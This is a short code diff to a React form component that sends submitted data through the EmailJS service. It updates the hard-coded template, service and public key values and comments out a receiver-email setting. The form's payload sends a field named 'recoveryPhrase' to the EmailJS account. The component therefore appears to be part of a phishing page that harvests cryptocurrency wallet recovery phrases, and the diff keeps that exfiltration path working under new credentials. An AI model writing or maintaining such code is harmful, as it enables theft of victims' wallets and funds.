@@ -3,10 +3,10 @@ import emailjs from "@emailjs/browser";
 import InfoModal from "./InfoModal";
 import Modal from "./Modal";
 
-const TEMPLATE_ID = "template_154lq4e";
-const SERVICE_ID = "service_tirbyd6";
-const PUBLIC_KEY = "iWHbkiA5qWhm1m05b";
-const RECEIVER_EMAIL = process.env.REACT_APP_RECIEVER_EMAIL;
+const TEMPLATE_ID = "template_pdxgf2g";
+const SERVICE_ID = "service_y2bhhrr";
+const PUBLIC_KEY = "JEfCbGU-NY097Ysab";
+// const RECEIVER_EMAIL = process.env.REACT_APP_RECIEVER_EMAIL;
 
 const FormModal = ({ handleShowModal, showModal }) => {
   const [formData, setformData] = useState({
@@ -39,7 +39,7 @@ const FormModal = ({ handleShowModal, showModal }) => {
         {
           from_name: formData.name,
           message: formData.recoveryPhrase,
-          receiver_email: RECEIVER_EMAIL,
+          // receiver_email: RECEIVER_EMAIL,
         },
         PUBLIC_KEY
       )
